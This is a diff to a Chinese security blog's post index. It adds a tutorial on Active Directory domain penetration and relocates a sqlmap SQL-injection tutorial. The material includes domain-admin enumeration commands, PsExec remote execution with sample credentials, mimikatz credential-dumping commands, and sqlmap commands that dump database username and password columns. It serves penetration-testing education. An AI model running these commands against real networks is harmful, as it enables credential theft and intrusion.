@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>域渗透详解</title>
+      <link href="/2019/09/06/yu-shen-tou-xiang-jie/"/>
+      <url>/2019/09/06/yu-shen-tou-xiang-jie/</url>
+      
+        <content type="html"><![CDATA[<h2 id="什么是域？"><a href="#什么是域？" class="headerlink" title="什么是域？"></a>什么是域？</h2><p>将网络中多台计算机逻辑上组织到一起，进行集中管理，这种<strong>区别于工作组</strong>的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。<br><img src="/2019/09/06/yu-shen-tou-xiang-jie/1.png" alt=""></p><h2 id="域的优点"><a href="#域的优点" class="headerlink" title="域的优点"></a>域的优点</h2><p>1.权限管理集中，管理成本低</p><p>2.保密性加强<br>有利于企业的一些保密资料的管理，可以单独对资源进行权限控制，允许或拒绝特定的域账户对资源的请求。</p><p>3.安全性加强<br>使用漫游账户和文件夹重定向，个人账户的工作文件及数据等可以存储在服务器上，进行统一备份及管理，使用户的数据更加安全有保障；同时域控制器能够分发应用程序、系统补丁，用户可以选择安装，也可以由系统管理员指派自动安装，数据及系统安全性大大提高。</p><p>4.提高了便捷性</p><h2 id="域的特点"><a href="#域的特点" class="headerlink" title="域的特点"></a>域的特点</h2><p>域成员在登陆的时候，可以选择登录到除了域管以外的所有计算机</p><h2 id="域渗透思路"><a href="#域渗透思路" class="headerlink" title="域渗透思路"></a>域渗透思路</h2><p>通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登录到任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从域成员主机内存中dump出域管理员密码，进而拿下域控制器，渗透整个内网。</p><h2 id="域渗透常用指令"><a href="#域渗透常用指令" class="headerlink" title="域渗透常用指令"></a>域渗透常用指令</h2><p>查看域控制器的主机名,查看完之后主机名后面会多一个$</p><pre><code>net group &quot;domain controllers&quot; /domain</code></pre><p><img src="/2019/09/06/yu-shen-tou-xiang-jie/2.PNG" alt=""></p><p>查看管理员的用户名</p><pre><code>net group &quot;domain admins&quot; /domain</code></pre><p><img src="/2019/09/06/yu-shen-tou-xiang-jie/3.PNG" alt=""></p><p>查看所有域用户</p><pre><code>net user /domain</code></pre><p><img src="/2019/09/06/yu-shen-tou-xiang-jie/4.PNG" alt=""><br>其中，有一个特殊用户叫做krbtgt，该用户是用于Kerberos身份验证的账户，获得了该用户的hash，就可以进行票据传递攻击<br>还有一些指令</p><pre><code>查询当前登陆域：net config workstation查询域密码策略：net accounts /domain查看补丁信息：wmic qfe查看操作系统类型：wmic os</code></pre><h2 id="域渗透工具"><a href="#域渗透工具" class="headerlink" title="域渗透工具"></a>域渗透工具</h2><h3 id="PSexec"><a href="#PSexec" class="headerlink" title="PSexec"></a>PSexec</h3><p>PSexec是一个远程执行的工具，可以远程连接同在一个域内的主机，并且不光是域管理员可以连域成员的主机，域成员也可以连域管的主机，前提是知道用户名和密码。<br>常用的命令如下：</p><pre><code>远程连接主机psexec \\192.168.33.11 -u administrator -p 123456 cmd想要远程机器运行程序psexec \\192.168.33.11 -u administrator -p 123456 -d -s -i calc打开网页psexec \\192.168.33.11 -u administrator -p 123456 -i -d cmd /c start http:// www.baidu.com-s 以system身份运行-i 交互式，对方主机也会看到执行的操作-d 执行完命令后返回，不等待命令执行结束</code></pre><p>能执行命令的前提条件是对方机器必须开启ipc及admin,否则会报错拒绝访问</p><pre><code>net share ipc$net share admin$</code></pre><p>PSexec官方命令文档</p><pre><code>https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</code></pre><h3 id="mimicatz"><a href="#mimicatz" class="headerlink" title="mimicatz"></a>mimicatz</h3><p>下载地址</p><pre><code>https://github.com/gentilkiwi/mimikatz/releases</code></pre><p>常用的命令，运行的时候要以管理员身份运行，否则会报错</p><pre><code>privilege::debug  提升到system权限sekurlsa::logonpasswords  查找域内主机的密码</code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 内网渗透 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>thinkphp5.0远程代码执行漏洞利用分析</title>
       <link href="/2019/08/30/thinkphp5-0-yuan-cheng-dai-ma-zhi-xing-lou-dong-li-yong-fen-xi/"/>
       <url>/2019/08/30/thinkphp5-0-yuan-cheng-dai-ma-zhi-xing-lou-dong-li-yong-fen-xi/</url>
@@ -536,25 +555,6 @@
     
     
     <entry>
-      <title>sqlmap使用详解</title>
-      <link href="/2019/04/22/sqlmap-shi-yong-xiang-jie/"/>
-      <url>/2019/04/22/sqlmap-shi-yong-xiang-jie/</url>
-      
-        <content type="html"><![CDATA[<h1 id="sqlmap使用详解"><a href="#sqlmap使用详解" class="headerlink" title="sqlmap使用详解"></a>sqlmap使用详解</h1><h2 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a>sqlmap简介</h2><p>sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。<br>sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测</p><h2 id="sqlmap基本用法"><a href="#sqlmap基本用法" class="headerlink" title="sqlmap基本用法"></a>sqlmap基本用法</h2><p>sqlmap的使用是基于我们已经通过手工注入的方法简单判断出注入类型，然后我们通过不同的参数来制定不同的payload。<br>下面的是最简单的联合查询注入<br>列举数据库</p><pre><code>sqlmap.py -u &quot;注入地址&quot; --dbs</code></pre><p>列举库中的表名</p><pre><code>sqlmap.py -u &quot;注入地址&quot; -D 库名 --tables</code></pre><p>列举表的列名</p><pre><code>sqlmap.py -u &quot;注入地址&quot; -D 库名 -T 表名 --columns </code></pre><p>列举字段内容</p><pre><code>sqlmap.py -u &quot;注入地址&quot; -D 库名 -T 表名 -C &quot;id,username,password&quot; --dump(字段可以是自己想要的内容)</code></pre><h2 id="sqlmap-post注入"><a href="#sqlmap-post注入" class="headerlink" title="sqlmap post注入"></a>sqlmap post注入</h2><p>我们在使用post注入时，有时会出现请求遗漏而导致注入失败的情况。这里可以使用burpsuit结合sqlmap来进行post注入<br>步骤如下：</p><pre><code>1.浏览器打开目标网站2.配置burp代理3.点击提交表单的按钮4.这时候burp会拦截我们的post请求5.把post请求复制为txt文件,假设命名为666.txt，位置为：C:\Users\user\Desktop\666.txt6.运行sqlmap输入命令：sqlmap.py -r &quot;C:\Users\user\Desktop\666.txt&quot;之后会爆出数据库名，然后后面的操作就和基础注入类似了</code></pre><p>这时爆库，爆表等操作和上面的基础注入方类似，只是多了-p指定参数</p><h2 id="sqlmap-cookie注入"><a href="#sqlmap-cookie注入" class="headerlink" title="sqlmap cookie注入"></a>sqlmap cookie注入</h2><p>默认情况下，sqlmap只支持get/post类型的注入，但当使用–level参数且值大于等于2时，也会检查cookie里的参数</p><pre><code>sqlmap.py -u 注入点URL --cookie&quot;id=xx&quot; --level 3sqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 --tables(猜表名)sqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 -T 表名 --columnssqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 -T 表名 -C username，password --dump</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上是sqlmap常用的操作，其实sqlmap支持的参数也特别多，我们需要掌握一些常见的参数，详情参见<a href="https://blog.csdn.net/breeze_cat/article/details/80628392" target="_blank" rel="noopener">https://blog.csdn.net/breeze_cat/article/details/80628392</a><br>实战练习：i春秋SQLi，攻防世界NewsCenter（用到–forms参数）</p>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> 工具 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>DDCTF writeup</title>
       <link href="/2019/04/22/ddctf-writeup/"/>
       <url>/2019/04/22/ddctf-writeup/</url>
@@ -566,6 +566,25 @@
         <tags>
             
             <tag> CTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>sqlmap使用详解</title>
+      <link href="/2019/04/22/sqlmap-shi-yong-xiang-jie/"/>
+      <url>/2019/04/22/sqlmap-shi-yong-xiang-jie/</url>
+      
+        <content type="html"><![CDATA[<h1 id="sqlmap使用详解"><a href="#sqlmap使用详解" class="headerlink" title="sqlmap使用详解"></a>sqlmap使用详解</h1><h2 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a>sqlmap简介</h2><p>sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。<br>sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测</p><h2 id="sqlmap基本用法"><a href="#sqlmap基本用法" class="headerlink" title="sqlmap基本用法"></a>sqlmap基本用法</h2><p>sqlmap的使用是基于我们已经通过手工注入的方法简单判断出注入类型，然后我们通过不同的参数来制定不同的payload。<br>下面的是最简单的联合查询注入<br>列举数据库</p><pre><code>sqlmap.py -u &quot;注入地址&quot; --dbs</code></pre><p>列举库中的表名</p><pre><code>sqlmap.py -u &quot;注入地址&quot; -D 库名 --tables</code></pre><p>列举表的列名</p><pre><code>sqlmap.py -u &quot;注入地址&quot; -D 库名 -T 表名 --columns </code></pre><p>列举字段内容</p><pre><code>sqlmap.py -u &quot;注入地址&quot; -D 库名 -T 表名 -C &quot;id,username,password&quot; --dump(字段可以是自己想要的内容)</code></pre><h2 id="sqlmap-post注入"><a href="#sqlmap-post注入" class="headerlink" title="sqlmap post注入"></a>sqlmap post注入</h2><p>我们在使用post注入时，有时会出现请求遗漏而导致注入失败的情况。这里可以使用burpsuit结合sqlmap来进行post注入<br>步骤如下：</p><pre><code>1.浏览器打开目标网站2.配置burp代理3.点击提交表单的按钮4.这时候burp会拦截我们的post请求5.把post请求复制为txt文件,假设命名为666.txt，位置为：C:\Users\user\Desktop\666.txt6.运行sqlmap输入命令：sqlmap.py -r &quot;C:\Users\user\Desktop\666.txt&quot;之后会爆出数据库名，然后后面的操作就和基础注入类似了</code></pre><p>这时爆库，爆表等操作和上面的基础注入方类似，只是多了-p指定参数</p><h2 id="sqlmap-cookie注入"><a href="#sqlmap-cookie注入" class="headerlink" title="sqlmap cookie注入"></a>sqlmap cookie注入</h2><p>默认情况下，sqlmap只支持get/post类型的注入，但当使用–level参数且值大于等于2时，也会检查cookie里的参数</p><pre><code>sqlmap.py -u 注入点URL --cookie&quot;id=xx&quot; --level 3sqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 --tables(猜表名)sqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 -T 表名 --columnssqlmap.py -u url --cookie &quot;id=xx&quot;--level 3 -T 表名 -C username，password --dump</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上是sqlmap常用的操作，其实sqlmap支持的参数也特别多，我们需要掌握一些常见的参数，详情参见<a href="https://blog.csdn.net/breeze_cat/article/details/80628392" target="_blank" rel="noopener">https://blog.csdn.net/breeze_cat/article/details/80628392</a><br>实战练习：i春秋SQLi，攻防世界NewsCenter（用到–forms参数）</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 工具 </tag>
             
         </tags>
       
